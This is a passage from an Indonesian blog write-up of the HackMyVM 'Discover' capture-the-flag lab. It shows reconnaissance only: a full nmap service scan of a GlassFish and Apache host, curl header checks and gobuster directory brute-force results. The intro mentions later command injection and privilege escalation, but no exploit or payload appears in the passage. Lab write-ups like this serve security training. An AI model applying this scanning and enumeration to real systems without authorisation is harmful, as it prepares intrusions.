<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackMyVM: Discover | sharpicx</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="HackMyVM: Discover" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine Discover yang disediakan oleh HackMyVM. Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah command injection sampai pada tahap privilege escalation yang membosankan karena saya perlu untuk membaca dokumentasi glasshfish (sebuah service Java untuk web application)." />
<meta property="og:description" content="Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine Discover yang disediakan oleh HackMyVM. Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah command injection sampai pada tahap privilege escalation yang membosankan karena saya perlu untuk membaca dokumentasi glasshfish (sebuah service Java untuk web application)." />
<link rel="canonical" href="http://localhost:4000/2022/09/09/hmv-discover" />
<meta property="og:url" content="http://localhost:4000/2022/09/09/hmv-discover" />
<meta property="og:site_name" content="sharpicx" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-09-09T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackMyVM: Discover" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-09T00:00:00+07:00","datePublished":"2022-09-09T00:00:00+07:00","description":"Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine Discover yang disediakan oleh HackMyVM. Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah command injection sampai pada tahap privilege escalation yang membosankan karena saya perlu untuk membaca dokumentasi glasshfish (sebuah service Java untuk web application).","headline":"HackMyVM: Discover","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/09/09/hmv-discover"},"url":"http://localhost:4000/2022/09/09/hmv-discover"}</script>
<!-- End Jekyll SEO tag -->


<meta name="keywords" content="command-injection,basic-overflow,glassfish,msfvenom" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/favicon.ico"/>
<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->


<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>


<script src="/assets/script/jekyllpaper.js" async ></script>
<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>


</head>
<body>
  <div class="container-wrapper">
    <header class="container-header">
      <div class="header-info">
  <span class="header-info-name">sharpicx</span><br/>
  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
</div>
<nav class="header-nav">
  <ul class="header-main-nav">
  
    <li class="header-main-nav-item"><a href="/">home</a></li>
  
    <li class="header-main-nav-item"><a href="/category">categories</a></li>
  
    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
  
  </ul>
</nav>

    </header>
    <main class="container-main">
      <article class="container-post">
  <div class="post-title" style="padding: 0px 0px 20px 0px">
    <h1>HackMyVM: Discover</h1>
  </div>
  <div class="post-author">
    <span>sharpicx</span>
  </div>
  <div class="post-content">
    <p>Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine <em>Discover</em> yang disediakan oleh <a href="https://hackmyvm.eu">HackMyVM</a>.
Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah <em>command injection</em> sampai pada tahap privilege escalation yang membosankan karena
saya perlu untuk membaca dokumentasi glasshfish (sebuah service <em>Java</em> untuk web application).</p>

<h2 id="recon">Recon</h2>
<h3 id="nmap-scanning">nmap scanning</h3>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:35
Completed NSE at 11:35, 0.00s elapsed
Initiating Ping Scan at 11:35
Scanning 192.168.56.8 [2 ports]
Completed Ping Scan at 11:35, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:35
Completed Parallel DNS resolution of 1 host. at 11:35, 6.52s elapsed
DNS resolution of 1 IPs took 6.61s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 2, TR: 4, CN: 0]
Initiating Connect Scan at 11:35
Scanning 192.168.56.8 [7 ports]
Discovered open port 8080/tcp on 192.168.56.8
Discovered open port 80/tcp on 192.168.56.8
Discovered open port 8181/tcp on 192.168.56.8
Discovered open port 4848/tcp on 192.168.56.8
Discovered open port 3700/tcp on 192.168.56.8
Discovered open port 7676/tcp on 192.168.56.8
Discovered open port 8686/tcp on 192.168.56.8
Completed Connect Scan at 11:35, 0.00s elapsed (7 total ports)
Initiating Service scan at 11:35
Scanning 7 services on 192.168.56.8
Completed Service scan at 11:37, 134.64s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.56.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:37
NSE Timing: About 99.48% done; ETC: 11:38 (0:00:00 remaining)
Completed NSE at 11:38, 31.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 3.60s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Nmap scan report for 192.168.56.8
Host is up, received syn-ack (0.00053s latency).
Scanned at 2022-09-09 11:35:28 WIB for 170s
warning: ruby-getoptlong will be installed before its ruby dependency
PORT     STATE SERVICE              REASON  VERSION
80/tcp   open  http                 syn-ack Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to http://discover.hmv/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3700/tcp open  giop                 syn-ack CORBA naming service
|_giop-info: ERROR: Script execution failed (use -d to debug)
4848/tcp open  appserv-http?        syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 202 Accepted
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Content-Type: text/html;charset=UTF-8
|     Connection: close
|     Content-Length: 6008
|     <span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span>
|     <span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">xml:lang=</span><span class="s">"en"</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;head&gt;</span>
|     <span class="c">&lt;!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public Lic
|   HTTPOptions: 
|     HTTP/1.1 405 OPTIONS method is not allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET, POST, HEAD, DELETE, PUT
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:31 GMT
|     Connection: close
|_    Content-Length: 0
7676/tcp open  java-message-service syn-ack Java Message Service 301
8080/tcp open  http-proxy           syn-ack Eclipse GlassFish  6.1.0 
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 3668
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;
|     &lt;html lang="en"&gt;
|     &lt;!--
|     Copyright (c) 2010, 2018 Oracle and/or its affiliates. All rights reserved.
|     Copyright (c) 2020 Contributors to the Eclipse Foundation.
|     This program and the accompanying materials are made available under the
|     terms of the Eclipse Public License v. 2.0, which is available at
|     http://www.eclipse.org/legal/epl-2.0.
|     This Source Code may also be made available under the following Secondary
|     Licenses when the conditions for such availability set forth in the
|     Eclipse Public License v. 2.0 are satisfied: GNU General Public License,
|     version 2 with the
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Allow: GET
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Server: Eclipse GlassFish 6.1.0 
|     X-Powered-By: Servlet/5.0 JSP/3.0(Eclipse GlassFish 6.1.0 Java/Debian/11)
|     Date: Fri, 09 Sep 2022 04:35:25 GMT
|     Connection: close
|_    Content-Length: 0
|_http-server-header: Eclipse GlassFish  6.1.0 
|_http-title: Eclipse GlassFish - Server Running
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
8181/tcp open  intermapper?         syn-ack
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Issuer: commonName=localhost/organizationName=Eclipse.org Foundation Inc/stateOrProvinceName=Ontario/countryName=CA/organizationalUnitName=GlassFish/localityName=Ottawa
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-22T16:19:00
| Not valid after:  2031-05-20T16:19:00
| MD5:   0b58 ea49 e0e1 0013 67a0 0ede d007 fb84
| SHA-1: 5dea 602a 3d43 65fd a141 3bb5 bea0 2320 f87a cb96
| -----BEGIN CERTIFICATE-----
| MIIDmTCCAoGgAwIBAgIEFr+FQDANBgkqhkiG9w0BAQsFADB9MQswCQYDVQQGEwJD
| QTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0YXdhMSMwIQYDVQQKExpF
| Y2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UECxMJR2xhc3NGaXNoMRIw
| EAYDVQQDEwlsb2NhbGhvc3QwHhcNMjEwNTIyMTYxOTAwWhcNMzEwNTIwMTYxOTAw
| WjB9MQswCQYDVQQGEwJDQTEQMA4GA1UECBMHT250YXJpbzEPMA0GA1UEBxMGT3R0
| YXdhMSMwIQYDVQQKExpFY2xpcHNlLm9yZyBGb3VuZGF0aW9uIEluYzESMBAGA1UE
| CxMJR2xhc3NGaXNoMRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDI1/xR4GcIAsIfJ+BCb7q/NZvwLkhDthYkR20kCpia
| LXyHfu697WTGCMe9jywBEYpa5JMge4ubOqLWwhZq9xAcVo1kv/t9iYByrgbOzvLT
| FvxlfWv5beeRQADo9r+PwtPNbWD+VzPTASEWNs7GDOV1nTzyXVDUgzNBwJWk9waI
| qCOyvfWb9Bl9moQLD0amNp6iCKIsEU+bpvREZFBoN6CiYcQdmkO5ie8hwbxPhQOk
| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8686/tcp open  java-rmi             syn-ack Java RMI
| rmi-dumpregistry: 
|   debian/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34231
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4848-TCP:V=7.92%I=7%D=9/9%Time=631AC29C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1851,"HTTP/1\.1\x20202\x20Accepted\r\nServer:\x20Eclipse\x20Gla
SF:ssFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\
SF:(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nContent
SF:-Type:\x20text/html;charset=UTF-8\r\nConnection:\x20close\r\nContent-Le
SF:ngth:\x206008\r\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-strict\.dtd\"&gt;\n&lt;html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\"\x2
SF:0xml:lang=\"en\"\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;!--\n\n\x20\x20\x20\x20Copyr
SF:ight\x20\(c\)\x202010,\x202018\x20Oracle\x20and/or\x20its\x20affiliates
SF:\.\x20All\x20rights\x20reserved\.\n\n\x20\x20\x20\x20This\x20program\x2
SF:0and\x20the\x20accompanying\x20materials\x20are\x20made\x20available\x2
SF:0under\x20the\n\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\
SF:x20License\x20v\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\
SF:x20\x20http://www\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20Thi
SF:s\x20Source\x20Code\x20may\x20also\x20be\x20made\x20available\x20under\
SF:x20the\x20following\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20t
SF:he\x20conditions\x20for\x20such\x20availability\x20set\x20forth\x20in\x
SF:20the\n\x20\x20\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20a
SF:re\x20satisfied:\x20GNU\x20General\x20Public\x20Lic")%r(HTTPOptions,E9,
SF:"HTTP/1\.1\x20405\x20OPTIONS\x20method\x20is\x20not\x20allowed\r\nServe
SF:r:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servl
SF:et/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/De
SF:bian/11\)\r\nAllow:\x20GET,\x20POST,\x20HEAD,\x20DELETE,\x20PUT\r\nConn
SF:ection:\x20close\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HT
SF:TP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x
SF:20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)
SF:\r\nDate:\x20Fri,\x2009\x20Sep\x202022\x2004:35:31\x20GMT\r\nConnection
SF::\x20close\r\nContent-Length:\x200\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.92%I=7%D=9/9%Time=631AC296%P=x86_64-pc-linux-gnu%r(Get
SF:Request,F3E,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Eclipse\x20GlassFish\
SF:x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclips
SF:e\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fri,\
SF:x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nContent-Type:\x20text/html\r
SF:\nConnection:\x20close\r\nContent-Length:\x203668\r\n\r\n&lt;!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;\
SF:n&lt;html\x20lang=\"en\"&gt;\n&lt;!--\n\n\tCopyright\x20\(c\)\x202010,\x202018\x
SF:20Oracle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserved\
SF:.\n\tCopyright\x20\(c\)\x202020\x20Contributors\x20to\x20the\x20Eclipse
SF:\x20Foundation\.\n\t\n\x20\x20\x20\x20This\x20program\x20and\x20the\x20
SF:accompanying\x20materials\x20are\x20made\x20available\x20under\x20the\n
SF:\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\x20License\x20v
SF:\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\x20\x20http://w
SF:ww\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20This\x20Source\x20
SF:Code\x20may\x20also\x20be\x20made\x20available\x20under\x20the\x20follo
SF:wing\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20the\x20condition
SF:s\x20for\x20such\x20availability\x20set\x20forth\x20in\x20the\n\x20\x20
SF:\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20are\x20satisfied
SF::\x20GNU\x20General\x20Public\x20License,\n\x20\x20\x20\x20version\x202
SF:\x20with\x20the\x20")%r(HTTPOptions,C5,"HTTP/1\.1\x20405\x20Method\x20N
SF:ot\x20Allowed\r\nServer:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\n
SF:X-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x20
SF:6\.1\.0\x20\x20Java/Debian/11\)\r\nAllow:\x20GET\r\nConnection:\x20clos
SF:e\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HTTP/1\.1\x20505\
SF:x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Eclipse\x20GlassFi
SF:sh\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fr
SF:i,\x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Length:\x200\r\n\r\n");
Service Info: Host: discover.hmv

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.55 seconds

</span></code></pre></div></div>
<p>banyak sekali open port yang sudah diperoleh oleh nmap.</p>
<ul>
  <li>80 - HTTP, Apache httpd 2.4.54</li>
  <li>3700 - TCP, COBRA naming service (saya tidak terlalu tau pasti ini apa)</li>
  <li>4848 - appserv-http?, semacam service untuk mengadministrasi web (maybe?)</li>
  <li>7676 - java-message-service</li>
  <li>8080 - Eclipse Glassfish 6.1.0</li>
</ul>

<p>karena pada output nmap di atas menunjukkan <em>url redirect</em>, dan biasanya saya sebelum pertikaian dimulai saya sudah mencoba testing pada <em>IP Host</em> apakah ada redireksi ke <em>custom domain</em> atau tidak. ternyata hasilnya</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-I</span> 192.168.56.8
HTTP/1.1 302 Found
Date: Fri, 09 Sep 2022 12:23:25 GMT
Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
Location: http://discover.hmv/
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

</code></pre></div></div>
<p>karena file <em>hosts</em> yang saya punya sudah saya buat <em>writable</em> maka saya sudah menyederhanakan diri saya sendiri untuk menambahkan apapun jenis <em>custom domain</em> kalau nanti-nanti saya memainkan permainan CTF atau membuat suatu <em>custom redirection</em> pada <em>public DNS</em>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ <span class="nb">echo</span> <span class="s2">"192.168.56.8"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<h3 id="3700---tcp-cobra-naming-service">3700 - TCP, Cobra naming service</h3>

<p><img src="https://i.ibb.co/mRxcg9C/image.png" alt="image" /></p>

<p><img src="https://i.ibb.co/2smmCt5/image.png" alt="image2" /></p>

<p>hmm, tidak ada hal yang menarik untuk ditelaah jadi saya mencoba memeriksa port yang lain lagi.</p>

<h3 id="4848---appserv-http">4848 - appserv-http?</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-sI</span> discover.hmv:4848
HTTP/1.1 302 Found
Location: https://discover.hmv:4848/
Content-Length: 0
Date: Fri, 09 Sep 2022 12:27:51 GMT

</code></pre></div></div>
<p>HTTP status menunjukkan 302, itu berarti masih bisa diakses tapi karena sifatnya <em>Moved Temporarily</em> berarti ini sudah menampakkan kesan bahwa ada kemungkinan munculnya redireksi, jadi saya cek apakah ada tampilah webnya atau tidak.</p>

<p><img src="https://i.ibb.co/XFZgPnB/image.png" alt="loginpage" /></p>

<p>disini malah menampilkan, login page. sudah saya coba googling untuk mendapatkan <em>default credentials</em> tetap saja sama tidak ada yang bisa. karena ini based on <em>Java</em> tidak ada kemungkinan yang bisa dicapai dengan SQLi ataupun metode lain.</p>

<h3 id="7676---java-message-service-301">7676 - Java Message Service 301</h3>

<p>sama seperti yang pertama, tidak ada tampilan yang ditunjukkan.</p>

<h3 id="8080---eclipse-glassfish-610">8080 - Eclipse Glassfish 6.1.0</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ curl <span class="nt">-I</span> http://discover.hmv:8080                                                                                          1 ↵
HTTP/1.1 200 OK
Server: Eclipse GlassFish  6.1.0 
X-Powered-By: Servlet/5.0 JSP/3.0<span class="o">(</span>Eclipse GlassFish  6.1.0  Java/Debian/11<span class="o">)</span>
Accept-Ranges: bytes
ETag: W/<span class="s2">"3668-1662713904312"</span>
Last-Modified: Fri, 09 Sep 2022 08:58:24 GMT
Content-Length: 3668
Content-Type: text/html
</code></pre></div></div>
<p><img src="https://i.ibb.co/VBkHWwb/image.png" alt="server-running" /></p>

<p>pada gambar diatas, server sudah berjalan dengan baik dan letak administrasi ditujukan pada port 4848. jadi, saya berniat untuk mengeceknya nanti.</p>

<h3 id="80---http-apache">80 - HTTP Apache</h3>

<p>ini adalah tampilan website secara keseluruhan.</p>

<p><img src="https://i.ibb.co/x61Zk9h/screencapture-discover-hmv-2022-09-09-19-43-23.png" alt="gambar" /></p>

<p>terlihat seperti website biasa dan mungkin terlihat sedikit template haha, dan di atas ada tombol login pada bagian navbar, mungkin saya bisa memasukkan metode-metode injeksi pada laman ini nantinya.</p>

<p>Tapi saya mencoba untuk mem-bruteforce website secara keseluruhan agar saya tau struktur websitenya.</p>

<h2 id="bruteforcing-directory">bruteforcing directory</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/discover]
╰─ <span class="nb">cat </span>scan_gobuster               
/contact.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1363]
/aboutus.jpg          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 507077]
/aboutus.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17734]
/home.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 29575]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/assets/]
/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/img/]
/admin.jpg            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6965]
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/css/]
/courses.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19066]
/review.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1277]
/courses              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/courses/]
/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/manual/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/js/]
/statistics.php       <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 1339]
/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 22] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> home.php]
/myaccount.php        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6302]
/payment.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1351]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/fonts/]
/forgotpassword.php   <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1063]
/forgotpassword.html  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8647]
/wall.jpg             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1540495]
/wall.png             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 698653]
/contactform          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/contactform/]
/back1.jpg            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 144583]
/chat1.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2604]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/chat2.php            <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 2287]
